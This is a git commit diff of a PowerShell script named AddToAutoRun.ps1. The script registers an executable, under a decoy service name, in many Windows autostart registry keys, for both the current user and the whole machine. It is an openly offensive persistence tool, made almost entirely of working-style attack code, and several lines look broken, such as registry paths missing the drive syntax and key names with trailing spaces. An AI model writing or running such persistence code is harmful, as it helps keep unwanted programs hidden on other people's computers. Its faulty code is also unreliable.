093b9029556231624070cd2ca46cd20fcbfc4851
CoffeeHaus <neumann6994@gmail.com>
2020-05-29 23:21:35 -0500

    Update AddToAutoRun.ps1

--- Powershell/AddToAutoRun.ps1
+++ Powershell/AddToAutoRun.ps1
@@ -3,8 +3,7 @@
 $PathtoExe = "C:\Users\user\Documents\tool.exe"
 $DecoyName = "Windows Windowing Service"
 
-#####User 
-
+#####User current
 
 $Reg = "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
 New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
@@ -15,11 +14,38 @@ New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "st
 
 $Reg = "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run"
 New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+
 #Run the program once, then clears after run
 $Reg = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce "
 New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
-
-$Reg = "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows\Run"
+$Reg = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnceEx "
 New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+
+$Reg = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices"
+New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+$Reg = "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
+New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+
+#####Machine
+
+
+    $Reg = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
+    New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+    #64Bit
+    $Reg = "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run"
+    New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+    
+    #Run the program once, then clears after run
+    $Reg = "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
+    New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+    $Reg = "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx"
+    New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+    
+    $Reg = "HKLM\System\CurrentControlSet\Services"
+    New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+    $Reg = "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices"
+    New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
+    $Reg = "HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce"
+    New-ItemProperty -path $Reg -name "Anything" -value $PathtoEXE -propertytype "string"
 
 Copy-Item -path $PathtoExe -Destination $Dest
